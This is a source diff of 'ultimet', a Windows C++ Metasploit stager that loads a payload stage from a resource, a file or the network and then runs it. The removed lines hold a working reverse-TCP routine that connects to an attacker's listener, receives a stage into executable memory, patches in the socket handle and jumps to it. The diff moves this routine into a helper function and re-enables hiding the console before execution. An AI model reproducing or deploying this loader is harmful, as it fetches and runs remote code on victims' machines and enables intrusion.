@@ -38,29 +38,27 @@ either expressed or implied, of the FreeBSD Project.
 */
 #include "main.h"
 
-PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
-unsigned char* buffer = nullptr;			// This will hold the loaded stage
-unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
-DWORD bufferSize = 0;						// buffer length
-DWORD StageSize = 0;						// if we're using encryption ... stage size = (bufferSize - 16) 
-DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
-char EncKey[17] = {0};						// XOR Encryption key
-void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
-bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager where stage is received over network. 
-int err = 0;								// Errors
-
-//If "-s" is specified (load stage from local file)
-wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
-
-// Reverse_TCP specific Variables
-SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_tcp
-
-// HTTP(S) Specific Variables
-char url[512] = {0};	//Full URL 
-
-
 int wmain(int argc, wchar_t *argv[])
 {
+	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
+	unsigned char* buffer = nullptr;			// This will hold the loaded stage
+	unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
+	DWORD bufferSize = 0;						// buffer length
+	DWORD StageSize = 0;						// if we're using encryption ... stage size = (bufferSize - 16) 
+	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
+	char EncKey[17] = {0};						// XOR Encryption key
+	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
+	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager where stage is received over network. 
+	int err = 0;								// Errors
+
+	//If "-s" is specified (load stage from local file)
+	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
+
+	// Reverse_TCP specific Variables
+	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_tcp
+
+	// HTTP(S) Specific Variables
+	char url[512] = {0};	//Full URL 
 	/*************
 	Program Start
 	*************/
@@ -125,7 +123,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		// Read resource into buffer ...
 		dprintf(L"[*] Loading stage into memory from resource...\n");
-		bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
+		bufferSize = ResourceToBuffer(101, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
 		if (bufferSize == 0) // if something went wrong...
 		{
 			dprintf(L"[!] Couldn't read stage from resource & \"-f\" not speified; falling back to \"stager\" mode...\n"
@@ -177,51 +175,12 @@ int wmain(int argc, wchar_t *argv[])
 
 		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
 		{
-			int len = 0;
-			ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT); // connect
-			if (ConnectSocket == INVALID_SOCKET) //Couldn't connect
-			{
-				dprintf(L"[-] Failed to connect ... will exit!\n");
-				exit(1);
-			}
-			dprintf(L"[+] Socket: %d\n", ConnectSocket);
-			// Got the concept from discussions on metasploit mailing list.
-			// Please read the whole thread: http://mail.metasploit.com/pipermail/framework/2012-September/008650.html
-			// the first one to apply this is Raphael Mudge (raffi@strategiccyber.com), most of the code below is taken from what Raphael did in the following project: 
-			// https://github.com/rsmudge/metasploit-loader
-
-			dprintf(L"[*] Connecting \"%s:%s\"\n", payload_settings.LHOST, payload_settings.LPORT);
-			int count = 0;
-			count = recv(ConnectSocket, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
-			if (count != 4 || len <= 0) 
-			{
-				dprintf(L"[-] We connected, but something went wrong while receiving stage size ... will exit!\n");			
-				exit(1);
-			}
-			dprintf(L"[*] Stage length = \"%d\" bytes.\n", len);
-			buffer = (unsigned char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE) ; //allocate
-			if (buffer == NULL)
-			{
-				err = GetLastError();
-				dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", err);
-				exit(1);
-			}
-			dprintf(L"[*] Success! \"%d\" bytes allocated.\n", (len + 5));
-			// Getting the stage
-			recv(ConnectSocket, (char*)buffer + 5, len, NULL);
-
-			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
-			buffer[0] = 0xBF;
-			dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
-			memcpy(buffer+1, &ConnectSocket, 4);
-			for(int i = 0; i < 64; i++)
-				printf("%02x ", buffer[i]);
-
-
-			// Now the buffer has 0xBF as first byte, socket number as following 4 bytes, and the stage at the rest of the buffer ...
-			// Buffer is ready.
-		}
+			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
+		} 
 	}
+		//--------- End of "working as a stager" ------------//
+	
+	
 	else //This is where "working as an inline stand-alone exe" stuff starts...
 	{
 		//Is the stage encrypted?
@@ -417,7 +376,7 @@ int wmain(int argc, wchar_t *argv[])
 	function = (void (*)())buffer;
 
 	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
-	//FreeConsole();
+	FreeConsole();
 	function();
 	return 0;
 }
